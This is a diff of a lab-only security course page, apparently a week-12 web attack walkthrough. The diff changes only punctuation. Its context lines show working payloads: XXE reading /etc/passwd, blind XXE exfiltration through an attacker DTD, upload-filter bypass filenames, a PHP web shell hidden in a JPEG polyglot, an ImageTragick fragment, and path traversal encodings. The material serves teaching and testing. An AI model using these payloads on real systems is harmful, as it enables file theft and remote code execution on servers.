@@ -1,4 +1,4 @@
-# Week 12: Attack walkthrough — XXE, File Upload, Path Traversal
+# Week 12: Attack walkthrough - XXE, File Upload, Path Traversal
 
 > ⚠️ **Lab only.**
 
@@ -8,7 +8,7 @@
 
 ### The pattern
 
-The XML standard supports "entities" — references that the parser resolves and inlines:
+The XML standard supports "entities" - references that the parser resolves and inlines:
 
 ```xml
 <!DOCTYPE foo [<!ENTITY hi "Hello">]>
@@ -17,7 +17,7 @@ The XML standard supports "entities" — references that the parser resolves and
 
 After parsing: `<root>Hello world</root>`. Fine.
 
-The dangerous variant is **external entities** — the entity value is a URL that the parser fetches and inlines:
+The dangerous variant is **external entities** - the entity value is a URL that the parser fetches and inlines:
 
 ```xml
 <!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
@@ -38,7 +38,7 @@ Any endpoint that accepts XML:
 - XMLRPC endpoints
 - Anything that says "Content-Type: application/xml" or "text/xml"
 
-### Step 2: Confirm XXE — fetch a file
+### Step 2: Confirm XXE - fetch a file
 
 ```xml
 <?xml version="1.0"?>
@@ -100,7 +100,7 @@ Parser:
 1. Fetches your DTD.
 2. The DTD defines `data` as the contents of `/etc/passwd`.
 3. The DTD defines `exfil` as a URL containing `%data;`.
-4. Parser fetches that URL — your server receives `/etc/passwd` contents in the query string.
+4. Parser fetches that URL - your server receives `/etc/passwd` contents in the query string.
 
 PortSwigger's "Blind XXE with out-of-band interaction with parameter entities" lab.
 
@@ -141,7 +141,7 @@ Several formats are XML under the hood:
 
 A file-upload endpoint that processes any of these is potentially an XXE entry point. Upload an SVG with an XXE payload; the rendering pipeline fetches the file you specified.
 
-## Part 2: File upload — bypass the validators
+## Part 2: File upload - bypass the validators
 
 ### The goal
 
@@ -160,9 +160,9 @@ if not filename.endswith(".jpg"):
 
 Bypasses:
 
-- **Double extension:** `shell.php.jpg` — passes the `.jpg` check, executes as PHP if the server is misconfigured to use the first matching extension
-- **Null byte (legacy):** `shell.php%00.jpg` — in older PHP, the null byte terminated the string for filesystem write but not for the extension check
-- **Case:** `shell.PhP` — case-insensitive filter required
+- **Double extension:** `shell.php.jpg` - passes the `.jpg` check, executes as PHP if the server is misconfigured to use the first matching extension
+- **Null byte (legacy):** `shell.php%00.jpg` - in older PHP, the null byte terminated the string for filesystem write but not for the extension check
+- **Case:** `shell.PhP` - case-insensitive filter required
 - **Alternative extensions:** `.phtml`, `.php5`, `.pht`, `.shtml` all execute as PHP in default configs
 
 ### Layer 2: Content-Type check
@@ -196,19 +196,19 @@ Bypass: prepend the magic bytes:
 <?php system($_GET['c']); ?>
 ```
 
-Now the file looks like a JPEG to the validator and like PHP to the interpreter. The file is a **polyglot** — valid in two formats simultaneously.
+Now the file looks like a JPEG to the validator and like PHP to the interpreter. The file is a **polyglot** - valid in two formats simultaneously.
 
 This is why magic-byte checks don't prevent web-shell uploads if the file is later executed by name.
 
 ### Layer 4: Image-libraries-only
 
-A server that re-encodes uploaded images through Pillow / ImageMagick / GraphicsMagick should strip the polyglot — the re-encode produces a clean image and discards the trailing PHP.
+A server that re-encodes uploaded images through Pillow / ImageMagick / GraphicsMagick should strip the polyglot - the re-encode produces a clean image and discards the trailing PHP.
 
 **Unless** the image library has its own bugs (Image Tragick), in which case re-encoding can itself be RCE.
 
 ### Step 5: Image Tragick (ImageMagick)
 
-ImageMagick's MVG and MSL formats let an attacker specify drawing commands — including reading and writing arbitrary files:
+ImageMagick's MVG and MSL formats let an attacker specify drawing commands - including reading and writing arbitrary files:
 
 ```
 push graphic-context
@@ -306,13 +306,13 @@ On Windows:
 | Strips `../` | `....//` (after the first `../` is stripped, the second pair remains) |
 | Strips `..` | `..%2f`, `..%252f` (double URL-encoded) |
 | Adds an extension (`.png`) | Null byte: `../../etc/passwd%00.png` (legacy) |
-| Allow-lists extension | `../../etc/passwd.png` doesn't exist, but `../../etc/passwd` does — depends on whether app does substring or exact-match |
+| Allow-lists extension | `../../etc/passwd.png` doesn't exist, but `../../etc/passwd` does - depends on whether app does substring or exact-match |
 | Requires path under `/var/www/uploads/` | `/var/www/uploads/../../../etc/passwd` |
 | Strips backslashes | Use forward slashes on Windows (Windows accepts both) |
 
 The PortSwigger lab catalog has each bypass.
 
-### Step 4: Zip slip — archive extraction traversal
+### Step 4: Zip slip - archive extraction traversal
 
 When an app extracts an uploaded zip:
 
@@ -358,7 +358,7 @@ S3 keys are essentially paths; `../` is a normal character but applications may 
 
 - **Stopping at file disclosure for XXE.** Pivot to SSRF, blind XXE, billion-laughs.
 - **Not testing every upload destination.** A file landing in storage but processed by an internal worker is still an attack surface.
-- **Forgetting double encoding** for path traversal — `..%252f` decodes to `..%2f` then to `../` if there are two decode passes.
+- **Forgetting double encoding** for path traversal - `..%252f` decodes to `..%2f` then to `../` if there are two decode passes.
 - **Trusting MIME types from the client.** They're sent by the client; the server has to verify content.
 - **Treating SVG as "just images."** They're XML, fully scriptable, full XXE surface.
 
